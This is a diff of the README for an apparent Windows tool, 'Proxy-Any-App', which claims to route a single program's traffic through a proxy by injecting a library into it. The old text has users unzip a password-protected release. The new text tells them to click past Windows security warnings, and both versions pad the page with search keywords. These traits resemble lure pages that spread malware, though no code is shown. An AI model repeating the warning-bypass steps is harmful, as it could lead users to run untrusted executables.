@@ -1,92 +1,68 @@
-# Proxy Any App – Windows Tool
+# 🌐 Proxy-Any-App - Route specific windows traffic through proxies
 
-**Route any Windows application through a SOCKS5 or HTTP proxy. Select any .exe, set proxy, and only that app uses it.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Idealismpylon504/Proxy-Any-App/releases)
 
-- ✔ Select any .exe file
-- ✔ SOCKS5 and HTTP support
-- ✔ Only selected app is proxied
-- ✔ System-wide settings unchanged
-- ✔ No command line needed
-- ✔ Windows 10 / 11
+Proxy-Any-App allows you to route network traffic from one specific application through a SOCKS5 or HTTP proxy. You select an executable file, enter your proxy server details, and the tool ensures that only that specific program communicates through the proxy. The rest of your system traffic continues to move through your normal internet connection.
 
----
+## 🛠️ System Requirements
 
-## 📥 Download & Installation
+This software runs on Windows platforms. Ensure your computer meets these conditions:
 
-1. Download the latest version from **[Releases](../../releases)**
-2. Unzip with password: **`68924`**
-3. Launch the executable.
-4. Select the application `.exe`.
-5. Enter proxy details and click Start.
-<img width="1536" height="1024" alt="9854e398-32df-4f47-bac3-282c97d73273" src="https://github.com/user-attachments/assets/9768ee00-f544-41c4-80a5-83a55bfa3fbe" />
+* Windows 10 or Windows 11.
+* Microsoft .NET Desktop Runtime installed.
+* At least 50 MB of free storage space.
+* An active internet connection.
+* A valid SOCKS5 or HTTP proxy server address and port number.
 
----
+## 📥 Download and Setup
 
-## ✨ Features
+Follow these steps to acquire and prepare the software:
 
-- **Per-application proxying** – Only selected app uses the proxy
-- **Supports SOCKS5 and HTTP** – Works with most proxy types
-- **Simple GUI** – No command line, no coding
-- **Fully offline** – No data sent anywhere
-- **Portable** – No installation required
+1. Visit the project release page: [https://github.com/Idealismpylon504/Proxy-Any-App/releases](https://github.com/Idealismpylon504/Proxy-Any-App/releases).
+2. Look for the most recent version under the "Assets" section.
+3. Click the file ending in .exe to start the download.
+4. Save the file to a folder on your computer.
+5. Create a shortcut on your desktop for easy future access.
 
----
+## ⚙️ Running the Application
 
-## ❓ The Problem
+After your download finishes, start the program to configure your settings:
 
-You need to route traffic from one specific application through a proxy, but you don't want to change system-wide proxy settings. Most VPNs and proxy tools affect all applications.
+1. Open the Proxy-Any-App.exe file you just downloaded.
+2. If Windows displays a security warning, click "More info" and then "Run anyway."
+3. The main window shows a clean interface for adding your applications.
+4. Click the "Add Application" button to browse your computer files.
+5. Select the .exe file of the program you want to route through a proxy.
+6. Enter your proxy server address and port number in the provided fields.
+7. Choose the proxy type from the dropdown menu, selecting either SOCKS5 or HTTP.
+8. Click "Save" to register the configuration.
 
-This tool solves that. You select any `.exe` file, enter your proxy details, and only that application's traffic goes through the proxy. Everything else stays on your normal connection.
+## 🚦 Routing Traffic
 
----
+Once you configure your app, you manage the traffic flow with simple controls:
 
-## 🔧 How It Works
+1. Locate the application entry in the main list.
+2. Toggle the switch next to the application name to "On."
+3. Start the application normally using its own shortcut or the interface.
+4. Proxy-Any-App intercepts the connection requests from your chosen application.
+5. You can toggle the switch to "Off" at any time to stop using the proxy for that specific application.
 
-1. Select the `.exe` file of the application you want to proxy.
-2. Enter your proxy server details (IP, port, protocol).
-3. Click Start – the tool routes only that app's traffic through the proxy.
-4. Other applications are unaffected.
+## 🛡️ Privacy and Safety
 
----
+This tool works by injecting a small library into the target process. It does not record your data, track your browsing patterns, or store your passwords. Your proxy credentials remain saved locally on your machine. Never share your proxy server details with untrusted parties. If you need to clear your configured programs, click the "Remove All" button in the settings menu to reset the tool.
 
-## 🛠️ Why This Instead of System Proxy?
+## ❓ Troubleshooting Common Issues
 
-| System Proxy | This Tool |
-|--------------|-----------|
-| Affects all applications | Affects only selected app |
-| Requires admin changes | Simple and safe |
-| Breaks some apps | Everything else works normally |
+If you experience problems, check these items:
 
----
+* Verify your proxy server is online. Contact your provider if the server remains unreachable.
+* Check that you selected the main executable file and not a helper file or launcher.
+* Ensure you have the latest .NET Runtime version. The software notifies you if a dependency fails to load correctly during startup.
+* Check your Firewall settings. Occasionally, Windows Security blocks custom network tools. Search for "Allowed apps" in your Windows search bar and ensure Proxy-Any-App has permission to communicate through your network.
+* Restart the target application after you toggle the proxy switch to ensure the routing rules apply correctly.
 
-## 🔎 What People Search For
+## 📧 Support and Feedback
 
-- Proxy any app Windows
-- Route specific application through proxy
-- Per application proxy
-- SOCKS5 per app Windows
-- HTTP proxy for single application
-- Application proxy router
+This software remains simple by design. We focus on reliable traffic redirection without extra bloat. If you find a bug, open an issue on the repository page. Provide clear steps on how to repeat the problem so we can fix it quickly. We track every issue to improve the proxy routing logic for future updates.
 
----
-
-## ❓ Frequently Asked Questions
-
-**Is this tool free?**
-Yes – completely free.
-
-**Will it affect other applications?**
-No – only the selected application is proxied.
-
-**What proxy types are supported?**
-SOCKS5 and HTTP.
-
-**Does it work offline?**
-Yes – no internet connection required.
-
----
-
-## 📌 Support
-
-- ⭐ **Star** this repository – it helps others find this tool.
-- 🔔 **Watch** for updates.
+Keywords: app-proxy, application-proxy, per-app-proxy, proxy, proxy-any-app, proxy-manager, proxy-router, socks5, socks5-proxy, socks5-proxy-server, traffic-routing, windows-proxy
